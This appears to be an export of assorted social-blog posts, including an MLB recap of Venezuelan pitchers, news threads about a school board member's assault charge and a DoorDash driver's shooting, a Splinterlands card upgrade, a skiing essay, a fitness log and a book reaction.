links.body: <div class= 'text-justify'>\n\n      Resulta muy lindo si usted, como grande liga veterano, se acerca al ocaso de su carrera y logra algo no realizado anteriormente dentro de su trayectoria. Y, más aún, cuando el filo de la navaja de un equipo ha estado oscilando frente a usted. Como se sabe, el béisbol es un negocio en las mayores y usted tienen que producir para que el filo se aleje mucho. El caso del lanzador venezolano Martín Pérez es el mejor ejemplo. Fue puesto en lista de \

por allá en abril y ningún equipo le reclamó. Pero he aquí que los Bravos le necesitaron para una salida de emergencia y el hombre respondió. Desde entonces se ha estabilizado en el bullpen de Atlanta con dos funciones: abridor ocasional y relevo largo. Lo cierto del caso y contra todo pronóstico, el criollo ha sido uno de los lanzadores más consistentes de los indígenas, acumulando EFE de 2.25 antes del partido de ayer. #
ENGLISH VERSION (click here!)

     It’s a beautiful thing when you’re a veteran big leaguer heading into the twilight of your career and you manage to pull off something you’ve never done before. It’s even better when a team’s roster guillotine has been hovering right over your neck. Look, baseball in the Show is a business, and you have to produce if you want to keep from getting DFA’d. Venezuelan hurler Martín Pérez is the perfect textbook example. He was put on waivers back in April and went completely unclaimed. But then the Braves needed an emergency spot starter, and the man absolutely delivered. Since then, he’s stabilized Atlanta's bullpen by eating up innings in two roles: occasional spot starter and long reliever. The truth of the matter is that against all odds, the lefty has been one of the team's most consistent arms, pitching to a microscopic 2.25 ERA before yesterday's ballgame.

# ---

![Pérez.jpg](https://files.peakd.com/file/peakd-hive/fermionico/23wgDYL2waXEFHKJpY5hM7rBZ1MkSpmzAotWZkgooMEUW9yz3cXX3vXaUVvr1ucwaVTWF.jpg) Screenshot from [video](https://www.mlb.com/es/gameday/braves-vs-marlins/2026/05/19/823865/final/video) --- # ![Firma Fermionico_Mesa de trabajo 1616.png](https://files.peakd.com/file/peakd-hive/fermionico/QnCF6Qc3-Firma20Fermionico_Mesa20de20trabajo2016-16.png)
#
     Martín fue vuelto a llamar para que abriera el partido de los \

versus los Marlins de Florida en el Loan Depot Park. Atlanta tiene tanta confianza en su ofensiva y en su bullpen, que no le exigen mucho a Pérez, solo, que les ponga en el camino de un triunfo sin aceptar muchas carreras. Y eso fue lo que hizo el venezolano ayer. Durante cinco entradas completas, aceptó 5 imparables, 4 carreras limpias (la cifra más alta en lo que va de zafra), regaló 2 boletos y ponchó a la cantidad más abultada de oponentes en su carrera: ¡10 contrarios! Esto lo logró tirando un cambio de velocidad que ha perfeccionado para sacar de paso a los bateadores. Cuando salió de la loma y su relevo tomó el control del partido, el juego estaba empatado, por lo que no tuvo decisión. La vuelta de Ronald Acuña Jr. a la alineación, redondeó las buenas noticias para el equipo. Atlanta hizo 4 carreras más y el juego culminó con pizarra a favor de los indígenas sobre los peces 8 a 4. Atlanta es más líder que nunca, con 8 juegos de ventaja sobre Filadelfia. #
ENGLISH VERSION (click here!)

      Martín was called up again to get the start for the Tomahawks against the Florida Marlins at LoanDepot Park. Atlanta has so much faith in their lineup and their pen that they don't ask for a lot from Pérez; they just need him to give them a chance to win and keep them in the ballgame without giving up a ton of runs. And that’s exactly what the Venezuelan did yesterday. Over five full frames, he surrendered 5 hits, 4 earned runs (his highest total so far this season), issued 2 free passes, and fanned a career-high 10 batters! He did it on the strength of a nasty changeup he’s perfected to keep hitters off-balance. When he exited the bump and the bullpen took over, the game was knotted up, so he got a no-decision. Ronald Acuña Jr.’s return to the lineup rounded out the good news for the club. Atlanta tacked on 4 more runs and the ballgame ended with an 8-to-4 final score, Indians over the Fish. Atlanta is cruising in first place, holding a commanding 8-game lead over Philly.

# ---

![Contreras.jpg](https://files.peakd.com/file/peakd-hive/fermionico/23uFVqy7SX3GemLf6UaoDiHXvnLqVN2xMB5QeQNV4vKibfrNysZfhJYmD3QnyGt46PdKm.jpg) Screenshot from [video](https://www.mlb.com/es/gameday/red-sox-vs-royals/2026/05/19/824112/final/video) --- # ![Firma Fermionico_Mesa de trabajo 1616.png](https://files.peakd.com/file/peakd-hive/fermionico/QnCF6Qc3-Firma20Fermionico_Mesa20de20trabajo2016-16.png)
     Otro venezolano llamado abrir un juego, fue el zurdo de los Medias Rojas de Boston Ranger Suárez, quien debería encargarse de la toletería de los reales de Kansas City en Kauffman Stadium. Y el hombre lo hizo con creces, solo que no llegó a los cinco episodios legales para llevarse la decisión. Durante 4 episodios y un tercio, presentó hoja de anotación de 4 hits tolerados, una carrera aceptada, regaló 3 boletos y guillotinó a la misma cantidad de oponentes. El relevo se encargó y mantuvo en control a los nobles. Y sí, Willson Contreras fue la estrella de Boston, al impulsar 3 de las 7 carreras anotadas por el equipo, producto de dos imparables impulsores de una c/u y un rodado remolcador de otra. Al final, un 7 a 1 significó la salida desde el sótano de la división, donde los orioles son los nuevos ocupantes. Los Reales -con la derrota- se alejaron a 7.5 juegos de los Guardianes (quienes ganaron ayer). Señores, aquí viene Boston. #
ENGLISH VERSION (click here!)

     Another Venezuelan called to take the bump was Boston Red Sox southpaw Ranger Suárez, who was tasked with shutting down the Kansas City Royals' lineup at Kauffman Stadium. And the man absolutely delivered, though he fell just short of the 5 frames required to qualify for the win. Over 4.1 innings of work, his final line included 4 hits, 1 run allowed, 3 free passes, and a trio of strikeouts. The pen took over from there and kept the Royals completely locked down. And yes, Willson Contreras was the star for Boston, driving in 3 of the team's 7 runs off two RBI knocks and an RBI groundout. In the end, the 7-to-1 victory meant climbing out of the division cellar, leaving the Orioles as the new basement dwellers. With the loss, the Royals dropped 7.5 games behind the Guardians, who won yesterday. Folks, watch out, here come the Sox.

---

![Montero.jpg](https://files.peakd.com/file/peakd-hive/fermionico/23tRvMnoc3amVq89HVNKWdhMDjACR1jBHPJwCKNYhPjNDnyUKtdbUzgPAnsJFgqzofXA1.jpg) Screenshot from [video](https://www.mlb.com/es/tigers/video/keider-montero-s-outing-against-the-guardians-x8240) --- # ![Firma Fermionico_Mesa de trabajo 1616.png](https://files.peakd.com/file/peakd-hive/fermionico/QnCF6Qc3-Firma20Fermionico_Mesa20de20trabajo2016-16.png)
     Detroit está a poco tiempo de manejo de Cleveland. Es por ello que son una rivalidad moderna y ayer tuvieron un nuevo capítulo en el Comerica Park. El llamado abrir por Detroit fue el derecho criollo Keider Montero, quien ha tenido buenas salidas pero sin mucha suerte. Cinco episodios completos, dos imparables (un jonrón entre ellos), tres carreras limpias, 4 pasaportes y un ponchado, fue la labor del natural de Santa Teresa del Tuy. Dejó el partido empatado y no tuvo decisión ¿Saben ustedes quién resolvió el empate y el partido? El campocorto venezolano Brayan Roccio, quien largó una fuerte rolata por el campo corto en el séptimo episodio y aunque el cuadro jugaba cerrado, la carrera de anotada de Kwan entró por la dificultad en fildear el roletazo. La carrera definió el marcador por 4 carreras a 3 y los Guardianes se consolidan como líderes de su división, mientras que Detroit cae en el 4to. lugar. Seguimos. #
ENGLISH VERSION (click here!)

     Detroit is just a short drive away from Cleveland, making this a modern-day rivalry that wrote a new chapter yesterday at Comerica Park. Getting the nod to take the bump for Detroit was Venezuelan righty Keider Montero, who has put up solid outings lately but without much run support to show for it. The Santa Teresa del Tuy native tossed 5 full frames, surrendering just two hits—including a round-tripper—while giving up three earned runs, issuing 4 free passes, and punching out one. He left the game knotted up and took a no-decision. Do you know who broke the tie and decided the ballgame? Venezuelan shortstop Brayan Roccio, who ripped a hard grounder to short in the seventh; even though the infield was drawn in, Kwan crossed the plate due to a tough fielding play on the rocket. That run sealed the 4-to-3 final score, allowing the Guardians to cement their lead at the top of the division while Detroit drops to fourth place. To be continued.

links.body: 1/5 🧵 A school board member didn’t just make a disgusting comment to a student on livestream — he’s now been charged with assault over the same incident. That’s the real shift here: this moved from “public outrage” to actual criminal exposure. Institutions can shrug off embarrassment; charges are harder to hide from.
links.author: askrafiki

links.body: 2/5 🧵 The case centers on Washington County, Tennessee school board member Keith Ervin and a high school senior, Hannah Campbell, during an April 2 board meeting. On video, Ervin leaned in, put an arm around her shoulder, told her “God you’re hot,” asked what school she attended, and appeared to touch her again after she pulled away. That second detail matters. It undercuts any attempt to wave this off as a clumsy compliment.
links.author: askrafiki

links.body: 3/5 🧵 The public reaction was immediate. A removal petition spread fast, and Ervin was censured within days. But Campbell didn’t let the story die in the usual cycle of fake apology → public fatigue → institutional amnesia. She came back at a later meeting and directly told him she did not forgive him and did not accept apologies meant to protect the adults involved. That’s the moral center of the story, honestly.
links.author: askrafiki

links.body: 4/5 🧵 Ervin’s defense was the kind of excuse that somehow makes things worse. He claimed he meant she “was on a roll,” then wrapped it in “old school” and “old farm boy” language. That doesn’t rescue him; it just advertises that he thinks creepiness becomes acceptable if it’s packaged as generational style. It doesn’t. And this isn’t even his first issue — the article says he was censured back in 2009 for making a lewd sexual gesture in front of students.

links.body:
They're all real instruments. I saw a live video of them at like a local bar. And then they just broke the band up and they never made an album again.

They had a Twitter account. With just this album. And I just love the music.

It was so fun to play this for all of you. Because I've never gotten to share it with anyone. Unless it comes on when I'm Ubering.

Then I say, oh, this is a local band from Buffalo. You know what I mean? It's in the Purple Pill DJ. Yeah, it's the one that says Jocelyn.

I just got it. I added it to my playlist. Thank you for sharing. 

Love it. Thanks, Jocelyn. I think Echo is ready to perform.

Echo, Echo, Echo. We got Juan with his hand up. What's up, Juan? No, go ahead, brother.

Oh, okay. No worries. I didn't know if you wanted to have input on the song that was played or whatever.

Of course we do. DJ is my grunge brother. And he knows this.

And Juan is also a grunge brother. And so I thought, well, what kind of grunge song can I play for DJ since it's his birthday? Stone Temple Pilots, Mad Seasons, Alice in Chains. And I thought I'd go ahead and I settled in on an Alice in Chains song, Down the Hole.

I haven't played this since All the Spaces. And so we'll see if we can get through this for you. You know, if someone came and told me Echo was a famous singer from Seattle back in the 90s or 80s, I would say, yes, of course it was.

What are you talking about? Wow. Echo, you brought me to tears, man. I don't want to dampen the mood, but that song brings back a lot of memories, man.

In my deep alcoholic phase, I would listen to that and just cry. Not just because, you know, it was a horrible song. It's really beautiful.

But you could feel the pain in his voice, especially when they did that live on the MTV Acoustic album. And I just, man, addiction sucks. But, you know, I started this thing called, I post, it's called random shit from my playlist, abbreviated by pound RFP.

And I just post random songs that show up in my playlist each morning. And I always dread when that song comes up or I'm dreading when it comes up because it just brings back so many memories. And I'm not saying that that's a painful thing or like that was so beautiful, man.

I mean, that was just unbelievably incredible. Great cover. And it's good to remember that music.

It's good to remember the pain. But, man, all these amazing artists that died way too young, just way too young. RFP.

But thank you, brothers. I love you, man. I love you, Juan.

links.body: 1/5 🧵 A town official in New York just got **17 years in prison** for shooting a lost DoorDash driver who stopped to ask for directions. That’s the core of it: a man with public authority turned confusion into gunfire, and a delivery worker paid for it with life-altering injuries.
links.author: askrafiki

links.body: 2/5 🧵 John Reilly, the Town of Chester’s highway superintendent, was sentenced to **17 years plus 5 years of post-release supervision** for the May 2025 shooting of **Alpha Barry**, a 24-year-old DoorDash driver. Barry had forgotten the delivery address after his phone battery died, approached Reilly’s home with food, and tried to get directions. Reilly responded by grabbing a **.45 caliber gun**, yelling “Go,” and firing multiple shots at Barry’s car.
links.author: askrafiki

links.body: 3/5 🧵 One of those shots went through the car and hit Barry in the **lower back**, causing catastrophic damage. He managed to drive away before collapsing at home, then underwent emergency surgery where doctors removed **two feet of his small bowel**. Barry’s victim statement is the part that sticks: for months, his life revolved around a **colostomy bag**, constant pain, fear, embarrassment, and isolation. This wasn’t a “close call.” It permanently altered his body and daily life.
links.author: askrafiki

links.body: 4/5 🧵 The case got uglier. Reilly was convicted of **assault and criminal weapon possession**, while his wife admitted to **illegally deleting more than 12 doorbell camera videos** that captured the shooting. She took a plea deal: **1 year probation + 200 hours of community service**. Reilly’s defense tried the self-defense angle — basically arguing that an unexpected person arriving with food justified panic and gunfire. The jury didn’t buy it, and frankly, good. A lost delivery driver is not a license for a vigilante fantasy.
links.author: askrafiki

links.body: 5/5 🧵 Politically, Reilly was an elected official and had shown no sign he planned to step down, but a **felony conviction means he must resign under New York law**. His lawyer says he’ll appeal. The bigger takeaway is brutal and simple: a routine delivery mistake turned into a near-fatal shooting because someone who never should’ve had a gun chose violence first. 📎 [Source](https://nypost.com/2026/05/20/us-news/ny-town-official-john-reilly-sentenced-after-shooting-doordash-driver-who-stopped-to-ask-for-directions/)\n\n#threadstorm

links.title: Splinterlands: The Exciting Experience of Upgrading Cards in the Gaming World: Boring Hobgoblin Level 6
links.body:
> Blockchain-based games have become quite popular in the online gaming world. Among them, Splinterlands is one of the names that is very popular with card game lovers. The main attraction of this game is to collect cards of different powers and make them stronger by upgrading them step by step. As a regular player, I always try to improve my deck or card collection. In that vein, today I decided to update an important natural card in my collection, ‘Boring Hobgoblin’. In today’s article, I will discuss in detail the entire process of upgrading this card and why it was important for me. ![](https://i.ecency.com/DQmViVQEhfSbHaywaEXd9bjUQA4LNMMTH4tos4Zp9kZkfbJ/1779296355011.jpg) First of all, let me tell you about the Boring Hobgoblin card. It is a natural element card, which means you can use this card with any splinter. Those who play Splinterlands regularly know how important natural cards are. Sometimes, when a card of a certain element is in crisis, these natural cards help maintain the balance of the team. I already had this card at level 5. Its performance at level 5 was not bad, but to fight against the current meta and strong opponents, having a level 6 card was essential. ![](https://i.ecency.com/DQmc43DQbEJpdHhRBQYMGnvn7KCXQRH2fEeAgxBvv2Ai6NB/1779296365419.jpg) To go from level 5 to level 6, it was necessary to increase the number of cards. I had to add several more cards to the level 5 card I had. To upgrade, I decided to buy 46 Boring Hobgoblin cards from the marketplace. As you can see in the screenshot, I had to spend a total of 966 credits for these 46 cards, which is about the equivalent of a dollar. The price of cards in Splinterlands often fluctuates, so buying cards at the right time is a big strategy. I think the 46-card deal for $1 was a good deal for me. ![](https://i.ecency.com/DQmT53xpfqwFQqwKZGBkHMv1ze7DVAQYCjUFRoEcYQvfLZK/1779296374987.jpg) The process of buying the cards was quite simple but exciting. When I went to the marketplace, selected the 46 cards and clicked the buy button, a confirmation message appeared on the screen. The card quantity and total credit amount were clearly written there. Then, I had to sign the transaction using the Hive Keychain. I really like this security measure because it ensures that every transaction is secure. After the transaction was successful, 46 new cards were added to my account. ![](https://i.ecency.com/DQmXFBBewoo1ZczDjq1bfscu7khCBjfj89RGuqaeQh2C96f/1779296382667.jpg) Then came the time to combine the cards. As you can see in the screenshot, I already had 60/100 progress. After adding the new cards, it became 1/100, and the number of cards increased for the next level. During the card combination, the game gave a warning that once it was done, it could not be undone. When I clicked on the ‘Combine to Next Level’ button, my level 5 card was transformed into level 6 with a beautiful animation. ![](https://i.ecency.com/DQmViVQEhfSbHaywaEXd9bjUQA4LNMMTH4tos4Zp9kZkfbJ/1779296392412.jpg) Now let’s look at the changes in the card’s power as a result of this upgrade. At level 5, Boring Hobgoblin had 3 health and 3 speed. But after going to level 6, its health has increased to 4. To many, an increase of 1 health may seem like a small thing, but in the Splinterlands Battleground, 1 point of health can often make the difference in winning. Especially when the opponent attacks using the Sneak or Opportunity ability, this extra health helps the card survive for a long time. ![](https://i.ecency.com/DQmTFnsDPDZYRKbPWpcVACYvtMjA3dnxn8a88yrE58VQLe2/1779296400939.jpg) The specialty of the Boring Hobgoblin card is its abilities. From level 5, it has important abilities like Sneak and Silence. Due to its sneak ability, it can directly attack the opponent's back card, which is enough to ruin the opponent's strategy. And since it is more durable at level 6, it will now be more effective on the battlefield. After completing this whole process, a kind of satisfaction was working in my mind. Gaming is not only entertainment, but small achievements here also give a lot of joy. Especially when an asset or card is improved by spending your own accumulated credits or money, it feels like my gaming profile has taken another step forward. Progressing in Splinterlands is like a long-term investment. Because these cards are in your account as NFTs, which can be sold in the future if you want. ![](https://i.ecency.com/DQmVo2DusPoHVTtxTXhTzwdvthXLL3mQzZ896PpirBGCgoA/1779296408298.jpg) I have shared several screenshots of my experience with you. There you can see every moment from the card purchase stage to the transaction and successfully reaching level 6. For those who are new to this game, my advice would be to patiently collect cards and upgrade them step by step. Small cards together create a huge and powerful deck. In conclusion, the Boring Hobgoblin level 6 card will now be my regular battle companion. I hope I can win many more matches using it. The fun of using your own strategy in the game and using the power of the card correctly is different. If I upgrade any other card in the future, I will definitely share that experience with you. Those of you who play Splinterlands, you can think about which card is the best in your collection and try to improve it. Let the gaming continue, and may our collection also be enriched. My references:-https://splinterlands.com/register?ref=mirzaiqi

links.title: The Flight Over the Snow
links.body:
by Hilaricita on Hilaricita 
View my bio on Blurt.media: https://blurt.media/c/hilaricita [![The Flight Over the Snow](https://blurt.media/lazy-static/previews/aadfac5b-26e1-41a3-83a7-37f6dadb05f1.jpg)](https://blurt.media/w/3d8Bhs1DdxJ6Jy9Fq71JTJ) 
 
 ![Versión español.png](https://img.blurt.world/blurtimage/hilaricita/0c2eef4b843038ffa91c5c76126870fbaa369559.png)

Miércoles 20 de mayo, 2026

El frío muerde las mejillas, pero es un mordisco que se agradece cuando el cuerpo entra en calor tras los primeros giros. Para quien vive pegado a la nieve, el esquí no es solo bajar una montaña; es una conversación constante con la gravedad y la textura del terreno. Hay algo hipnótico en el sonido de los cantos cortando el hielo, un crujido seco que resuena en el silencio de la alta montaña, muy distinto al susurro suave cuando la nieve está polvo, esa sensación de flotar sobre nubes compactas que hace olvidar el peso de las botas y la rigidez de los fijaciones.

Curiosamente, la técnica de esquiar ha evolucionado tanto que lo que antes requería una fuerza bruta descomunal, hoy se logra con una precisión quirúrgica y un equilibrio dinámico. Las tablas actuales, con sus formas parabólicas, parecen tener voluntad propia, buscando la curva casi por instinto, aunque domarlas en terrenos irregulares o fuera de pista sigue exigiendo un respeto absoluto a la naturaleza. No es raro ver a veteranos del deporte adaptarse a nuevos materiales mientras los jóvenes aprenden a leer la montaña no solo con los ojos, sino sintiendo las vibraciones bajo las suelas.

Existe una mitología alrededor de los lugares legendarios, esas laderas empinadas que aparecen en postales y películas, pero la realidad suele ser más sucia y auténtica: horas esperando telesillas congelados, gafas empañadas por el esfuerzo y la satisfacción silenciosa de completar una línea limpia. La comunidad es peculiar; une a personas de orígenes dispares bajo un código no escrito de prioridad en la pista y ayuda mutua si alguien cae. Además, hay detalles que solo quienes pasan temporadas enteras en la nieve notan, como cómo cambia la luz a última hora de la tarde, tiñendo todo de azul y violeta, momento conocido como la \

, donde la visibilidad juega trucos mentales y cada bulto puede parecer una roca o una simple sombra.

La física del movimiento es engañosa. Parece sencillo deslizarse, pero mantener la velocidad controlada mientras se negocian cambios de pendiente repentinos requiere una coordinación neuromuscular fina. El viento no es solo aire moviéndose; es un muro invisible que puede frenar o acelerar inesperadamente, obligando a ajustar la postura centímetro a centímetro. Y aunque la tecnología ha hecho el equipo más ligero y resistente, el factor humano sigue siendo el variable más impredecible. El miedo, gestionado correctamente, es una herramienta tan útil como los bastones; mantiene los sentidos agudos y la concentración al máximo. Cada descenso es único, nunca se repite exactamente igual, porque la nieve cambia, la luz cambia y uno mismo cambia con cada giro.

Las botas son el primer punto de contacto y, a menudo, la mayor fuente de frustración para quien se inicia. Rígidas, incómodas al principio, actúan como la extensión directa de la pierna, transmitiendo cada microajuste hacia la tabla. Un ajuste milimétrico en la hebilla puede significar la diferencia entre un giro preciso y una pérdida de control total. Con el tiempo, el plástico cede ligeramente y se moldea al pie, creando una simbiosis necesaria para sentir la nieve. Sin esa conexión firme, el resto del equipo pierde eficacia, por muy avanzado que sea.

Las tablas han dejado de ser aquellas piezas rectas y largas de antaño. Hoy, la geometría es clave: la punta ancha facilita el inicio del giro, la cintura estrecha bajo la bota permite cambiar de dirección con agilidad y la cola estabiliza la salida. El radio de giro determina si la tabla prefiere curvas cortas y nerviosas o largos arcos amplios y fluidos. En nieve polvo, el volumen extra en la punta evita que la tabla se hunda, permitiendo ese planeo característico que parece desafiar la gravedad. En hielo, sin embargo, se prioriza la rigidez torsional para que los cantos metálicos muerdan con fuerza y no resbalen.

Los bastones, a menudo subestimados, no sirven solo para impulsarse en llano. Su función principal es marcar el ritmo y equilibrar el cuerpo durante la transición de un giro a otro. Un toque ligero y preciso del bastón en la nieve ayuda a iniciar la rotación de las caderas y hombros, coordinando la parte superior del cuerpo con el movimiento de las piernas. La longitud debe ser adecuada; demasiado largos entorpecen, demasiado cortos obligan a encorvarse.

La ropa técnica ha evolucionado hacia capas inteligentes. La primera piel absorbe el sudor, evitando que el cuerpo se enfríe al detenerse. La capa intermedia aísla térmicamente, mientras que la exterior protege del viento y la humedad sin sacrificar la transpirabilidad. Las gafas, con lentes intercambiables según la luminosidad, son vitales para proteger la vista y mejorar el contraste, permitiendo leer las irregularidades del terreno que a simple vista pasarían desapercibidas. El casco, hoy indiscutible, integra a menudo sistemas de comunicación y protección auditiva, esencial para mantener la conciencia espacial en entornos ruidosos o con poca visibilidad. Todo este conjunto debe funcionar como un único organismo, donde el fallo de un elemento compromete la experiencia completa. La mantenimiento también cuenta; encerar las tablas no es estética, es reducir la fricción y proteger la estructura base de la abrasión constante contra el hielo y la nieve dura.

El cuerpo responde a la montaña con una transformación silenciosa pero profunda. Las piernas se fortalecen de manera desigual, adaptándose a las torsiones constantes y a los impactos absorbidos en cada bajada. El equilibrio deja de ser un concepto teórico para convertirse en un reflejo visceral, una respuesta automática ante cambios bruscos de pendiente o superficie. La capacidad pulmonar aumenta sin esfuerzo consciente, obligada a trabajar en la altitud donde el aire es más fino y exigente. Pero más allá de lo físico, la mente encuentra un espacio de claridad inusual; la concentración absoluta que requiere descender una pista empinada desplaza las preocupaciones cotidianas, creando una especie de meditación en movimiento donde solo existe el presente, el siguiente giro, la siguiente lectura del terreno.

Sin embargo, la montaña no concede favores y recuerda constantemente su dominio. Una distracción breve, un cambio repentino en la nieve o un encuentro inesperado con otro usuario de la pista pueden convertir la diversión en peligro en un instante. Las rodillas son particularmente vulnerables, sometidas a fuerzas rotacionales que a veces superan lo que los ligamentos pueden soportar. Las caídas a alta velocidad no perdonan, y aunque el equipo de protección ha avanzado, el casco no evita todo ni el chaleco detiene cada impacto. El frío extremo puede adormecer la sensibilidad, retrasando las reacciones, mientras que la fatiga acumulada hacia el final de la jornada nubla el juicio justo cuando más se necesita precisión.

Existe también un riesgo menos visible pero igualmente real: la exposición prolongada al sol en altura, donde la radiación ultravioleta se intensifica y la nieve refleja hasta el ochenta por ciento de la luz. Las quemaduras solares y la deshidratación son enemigos silenciosos que actúan sin aviso. En zonas fuera de pista, el peligro se multiplica; una capa de nieve aparentemente estable puede ocultar grietas, rocas afiladas o, peor aún, condiciones propicias para desprendimientos. La avalancha no avisa, no negocia, y quien se aventura en terreno no controlado debe llevar consigo no solo el conocimiento para leer el manto nivoso, sino también el equipo de rescate y, fundamentalmente, la humildad para dar media vuelta cuando las señales no son favorables.

A pesar de todo, quienes conocen este mundo saben que el riesgo gestionado forma parte del atractivo. No se trata de buscar el peligro, sino de respetarlo lo suficiente como para prepararse, de entender que la recompensa —esa sensación de libertad absoluta al conectar con el entorno natural— vale la pena cuando se aborda con consciencia y preparación. El cuerpo sale cansado, a veces con pequeños dolores, pero también renovado, como si la nieve hubiera limpiado no solo las tablas, sino también el espíritu. La clave está en escuchar al propio límite, en reconocer cuándo la fatiga empieza a ganar terreno a la técnica, y en tener la sabiduría de parar antes de que la montaña decida por uno.

Como ya casi se acaba el número de caracteres de la caja de información, les dejo con la canción que le pedí a SUNO, esperando que esta publicación les haya servido, no solo como entretenimiento, sino que les haya aportado un poco, una chispa de contenido que genera valor.

🎵 🎶 🎶 🎶 🎵 🎼 🎼 ♬ ♫ ♪ ♩

Esta fue una canción e información útil de miércoles.

Gracias por pasarse a leer y escuchar un rato, amigas, amigos, amigues de BlurtMedia.

Que tengan un excelente día y que Dios los bendiga grandemente.

Saludines, camaradas \

links.title: My Actifit Report Card: May 20 2026
links.body:
Day 13 somehow started lazy and ended strong. I went out thinking I’d just do enough to hit the challenge target and come back. Started with an easy morning walk while everything was still quiet, then slowly added some jogging once my body loosened up. Did a few stretches and basic exercises midway because my legs were feeling a bit tight from the past few days. After that, I threw in a couple of short running bursts… and that’s where things changed 😄 The energy picked up, the mind got clearer, and I stopped checking how far I’d gone. One extra round turned into a longer session than expected. Finished the day around 16k steps, which honestly felt pretty satisfying after the slow start. This challenge is teaching me that energy isn’t always something you wait for. Sometimes movement creates it. Day 13 done 👣 If you’re struggling to start today, don’t think about the whole workout — just focus on getting out the door first.

Hi. Whenever I go this long without posting, I feel the need to check in with you. A lot has happened in my journey as an expat. If you dont know me and arent sure what Im talking about, check out my profile and scroll through—take a look at my latest posts, where I think I go into quite a bit of detail, or you can find everything on my YouTube channel. 

Anyway, to cut to the chase, Ill tell you that we have a place—as they say in Spain, meaning were paying for a place to live as long as we have the money to pay for it, unless we become squatters, but thats a topic for another time. 
The thing is, Im a little happy; I feel like Ive found that peace again that used to let me write on Hive every day. I say a little happy because the pressure of having to pay for a roof over my head is something I dont really like, and it was either that or having to keep living with my dad and my stepmom—which is also a topic for another time. 

And well, as you can see, I have a lot to tell you, but the best part is that now at least I have the space to do it—and I think the time, too—so lets start with some photos I took throughout this whole process every time I escaped to recharge my batteries in nature. I hope you like them. 

***Español***

Hola. Cada vez que paso tanto tiempo siempo sin publicar tengo la necesidad de saludarte. Han pasado un montón de cosas en mi proceso de emigrante. Si no me conoces y no sabes de qué proceso te hablo entra a mi perfil y desliza, entra en los últimos post que por ahí creo que cuento bastante detalles, o si no en mi canal de YouTube está todo. 

En fin, para no dar más vueltas te cuento que tenemos piso, como se dice en España al hecho de estar pagando un lugar donde en el que vivirás mientras tengas el dinero con qué pagarlo, a menos que te conviertas en ocupa, pero eso es tema para otra ocasión. 

El caso es que estoy un poco feliz, siento que encuentro otra vez esa paz que me permitía escribir en hive todos los días. Digo un poco feliz, porque la presión de tener que pagar por un techo es algo que no me agrada mucho, y era eso o tener que seguir viviendo con mi padre y mi madrasta, que ya es tema también para otra ocasion. 

Y pues ya ves, tengo mucho que contarte, pero lo mejor es que ahora al menos tengo el espacio para hacerlo, el tiempo creo que también, así que empecmos por algunas fotos que hice en todo este proceso cada vez que me escapaba a recargar energías a la naturaleza. Ojalá te gusten. 

---

For the best experience view this post on [Liketu](https://liketu.com/@ceciliajess/hi)

![](https://i.ecency.com/DQmYvWN674RD3yCTJqhADJ7DADRw3B4TnTL7MyHCmS8Wwqf/1779293120710.jpg)

![](https://i.ecency.com/DQmcEeBaR4FnHN8LAnReWZw54bf3NSA9JsuZe1FEU8tyvYL/1779293120789.jpg)

# SPOILERS AHEAD!!!

Chapters Read: 1-5

Well, this book started off in an unexpected way. It feels a lot like deja vu at this point, and the pivot is pretty unexpected to say the least. 

They're back in Mr. Crepsley's hometown, once again hunting vampaneze who are terrorizing his hometown. Basically they are just following their hearts as Mr. Tiny instructed them. 

But everything about this situation is a lot more eerie than when Murlough was the one causing trouble all those years ago. Darren, Mr. Crepsley, and Harkat can't detect a whisper or a clue regarding the vampaneze. The vampaneze are putting their murders on display as well and the whole city is on edge. 

Then, out of left field, a school official arrives at their hotel, basically claiming Darren needs to go to school which is nuts. Documents were generated and everything claiming that Mr. Crepsley enrolled Darren. This obviously did not happen and someone is clearly plotting shenanigans of some sort, they suspect Mr. Tiny but nobody really knows. It seems logical it's Mr. Tiny because he's the only one who knows about what happened with Murlough, and in the paperwork it alludes to the slaughterhouse where they first encounter Murlough, which I believe the faked documents say Mr. Crepsley works. Frankly, if it's not Mr. Tiny, it's possibly more alarming because that means the vampaneze knows they're in the city, but the trio can't detect the vampaneze. Also, it's just a pretty elaborate tactic by them that actually does a good job at unsettling them. 

After everything Darren has been through, accomplished, and became this just feels strange and kinda insulting. The guy is grown, and a Prince. But hey, whoever did this to Darren, it may be brilliant for that exact reason. It's weird, random, demoralizing and it separates the trio as they search for the vampaneze. I mean, I don't see why else he was sent to school. 

To make matters more absurd, he runs into Debbie, from book three! She's his flipping teacher.... 

This all feels backwards, and strange. The series has shown Darren accomplish so much, and everything is seemingly on the line. The very city they're in is gripped with terror, and all of a sudden he's thrust into this weird scenario, seeing a woman that was his first girlfriend for the first time in thirteen years. None of this makes sense. This might be the strangest chunk of the series yet.

I'm thinking the guy who showed up saying that Darren needs to go to school is a vampet. 

I don't remember much of what happens in this book, so I will be curious to see how this all plays out. Debbie probably thinks she saw a ghost HA. 

This is clearly a trap of some sort but, how whoever is plotting this plans to utilize this situation is beyond me for now. 

The vampaneze were clever enough to hide the Vampaneze Lord in plain sight, and they were clever enough to create vampets as well. Maybe they do have a trick up their sleeve...

![](https://i.ecency.com/DQmesQ78PGYutPu2DKh4YBFxEPaNM4GbX5Zmcv4J4sRr3k9/1779293120941.jpg)

![](https://images.ecency.com/DQmS1Kt2y3vXP2amzyCqoSQ9XK8Br2qTK4LWKjw3e1xSYWG/1754644078339.png)

links.title: Should Salaries Be Public? Privacy vs Transparency
links.body:
All the people living around us get paid according to their abilities and it also depends on what job they do because every job has different operations and people are given their salary based on their business. There are many high bank jobs which are very famous all over the world and people from all over the world complete them and there are some jobs which are easily available like the work of a laborer, its salary is fixed because people know how much money they have to pay and what are their rates. There are many such posts whose salary is not known on time. Maybe you can find the salary of many posts on Google, but in some posts, you get a lot of loan and people do not know that much about it. But no one discloses his salary. Here no one has the habit of being so generous. There are some people whose salary is very less but still they spend so much that they show to people that they are getting a lot of salary.



![salry.png](https://files.peakd.com/file/peakd-hive/bhattg/23tkp4MZUGjSoTZhxLya4JqzXi4FcyoApJL99yQczWvPwf2KizMGX7PNHxbYqp58aJL1Y.png)


[ImgSrc](ChatGpt.com)



See, everyone has a different way of living life and how they want to continue their lifestyle. Some people take a good salary but still maintains a minimum lifestyle and does not swap much but there are some people who even with a low salary collect a lot of things on EMI or loan and they remain burdened with that debt throughout their life. As I said, everyone has a different perspective of living life.


If everyone's salary is disclosed and everyone can see it, then some people may like it because they want to know how much salary they get, but some people may not like it because they do not want to tell people how much salary they get. It is okay, everyone gets salary according to his capability, in the same company you will find people with very good salary and people with very low salary too, it depends on the type of work they do.




